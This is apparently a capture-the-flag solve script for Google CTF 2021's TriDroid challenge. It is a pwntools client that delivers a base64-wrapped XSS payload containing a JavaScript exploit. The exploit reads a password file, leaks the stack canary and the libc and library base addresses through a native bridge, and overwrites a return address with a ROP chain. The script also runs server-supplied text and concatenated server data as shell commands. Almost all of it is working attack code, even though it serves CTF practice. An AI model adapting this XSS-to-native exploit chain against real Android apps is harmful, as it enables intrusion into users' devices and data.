#!/usr/bin/env python3
# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Author: Sajjad "JJ" Arshad (sajjadium)

import base64
import subprocess
from pwn import *
import sys
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('--host', action='store', help='Host IP/domain', required=True)
parser.add_argument('--port', action='store', type=int, help='Port number', required=True)
parser.add_argument('--pow', action='store_true', help='Handle proof of work', required=False)
args = parser.parse_args()

exploit_js = b"""
function pack(number) {
    let hexed = number.toString(16).padStart(16, 0);
    let rev_hexed = [];
    for (let i = hexed.length - 2; i >= 0; i -= 2) {
        rev_hexed.push(hexed.slice(i, i + 2));
    }
    return unhex(rev_hexed.join(''));
}

function unpack(bytes) {
    let hexed = hex(bytes);
    let rev_hexed = [];
    for (let i = hexed.length - 2; i >= 0; i -= 2) {
        rev_hexed.push(hexed.slice(i, i + 2));
    }
    return parseInt(rev_hexed.join(''), 16);
}

function hex(bytes) {
    let hexed = [];
    for (let i = 0; i < bytes.length; i++) {
        hexed.push(bytes.charCodeAt(i).toString(16).padStart(2, '0'));
    }
    return hexed.join('');
}

function unhex(hexed) {
    let bytes = [];
    for (let i = 0; i < hexed.length; i += 2) {
        bytes.push(String.fromCharCode(parseInt(hexed.slice(i, i + 2), 16)));
    }
    return bytes.join('');
}

function leak_top_element_address() {
    bridge.manageStack(password, 'push', hex('a'.repeat(16)));
    next_ptr = unpack(unhex(bridge.manageStack(password, 'top', '')).slice(16));
    bridge.manageStack(password, 'pop', '');
    return next_ptr;
}

function leak_address_content(address) {
    bridge.manageStack(password, 'push', '');
    bridge.manageStack(password, 'modify', hex('a'.repeat(16) + pack(address)));
    bridge.manageStack(password, 'pop', '');
    return unhex(bridge.manageStack(password, 'top', ''));
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
        password = xhr.responseText;

        // leak heap addresses
        bridge.manageStack(password, 'push', hex('showFlag'));
        method_name_heap_address = leak_top_element_address();
        bridge.manageStack(password, 'push', hex('()V'));
        method_desc_heap_address = leak_top_element_address();

        // leak stack addresses
        bridge.manageStack(password, 'push', '');
        bridge.manageStack(password, 'modify', '');
        stack_canary_address = unpack(unhex(bridge.manageStack(password, 'top', '')));
        stack_ret_address = stack_canary_address + 0x8;
        bridge.manageStack(password, 'pop', '');

        // leak stack canary on the stack
        canary = leak_address_content(stack_canary_address).slice(0, 8);

        // leak return address of snprintf in manageStack and find lib NDK base address
        libndk_base_address = unpack(leak_address_content(stack_ret_address)) - 0x15d9;

        // leak malloc GOT entry and find libc base address
        malloc_got_address = libndk_base_address + 0x2f70;
        libc_base_address = unpack(leak_address_content(malloc_got_address)) - 0x43410;

        // replace return address of modify_element function
        saved_rpb = stack_canary_address + 0x100;
        env_address = unpack(leak_address_content(saved_rpb - 0x60));
        jthis_address = unpack(leak_address_content(saved_rpb - 0x68));
        invoke_java_method_address = libndk_base_address + 0xfa0;

        payload  = pack(libc_base_address + 0x42c92); // pop rdi; ret;
        payload += pack(env_address);                 // env argument
        payload += pack(libc_base_address + 0x42d38); // pop rsi; ret;
        payload += pack(jthis_address);               // jthis argument
        payload += pack(libc_base_address + 0x46175); // pop rdx; ret;
        payload += pack(method_name_heap_address);    // "showFlag" string
        payload += pack(libc_base_address + 0x42e58); // pop rcx; ret;
        payload += pack(method_desc_heap_address);    // "()V" string
        payload += pack(libc_base_address + 0x45e13); // pop rax; ret;
        payload += pack(invoke_java_method_address);  // invokeJavaMethod address
        payload += pack(libc_base_address + 0x443e3); // call rax;

        bridge.manageStack(password, 'push', '');
        bridge.manageStack(password, 'modify', hex('a'.repeat(0x20 + 0x8) + canary + pack(saved_rpb) + payload));
    }
}

xhr.open('GET', 'file:////data/user/0/com.google.ctf.pwn.tridroid/files/password.txt', true);
xhr.send('');
"""

final_exploit = base64.b64encode(b"<img src=hehe onerror=eval(atob('%s'))>" % base64.b64encode(exploit_js)).decode()

r = remote(args.host, args.port)

if args.pow:
  print(r.recvuntil("You can run the solver with:\n").decode())
  proof_of_work = r.recvuntil("Solution?").decode()
  print(proof_of_work)
  answer = subprocess.check_output(proof_of_work.strip().split("\n")[0], shell=True).decode().strip()
  print(answer)
  r.sendline(answer.split("\n")[-1])

print(r.recvuntil("Preparing TriDroid. This may take a while ...\n").decode())

print(r.recvuntil("Please enter your name encoded in base64:\n").decode())
r.sendline(final_exploit)

print(r.recvuntil("Thank you! Check out the logs. This may take a while ...\n").decode())

print(r.recvuntil("TriDroid: Flag: ").decode())
encrypted_flag = r.recvline().decode().strip()

subprocess.call("javac Exploit.java", shell=True)
print(subprocess.check_output("java Exploit " + encrypted_flag, shell=True).decode().strip())

r.interactive()
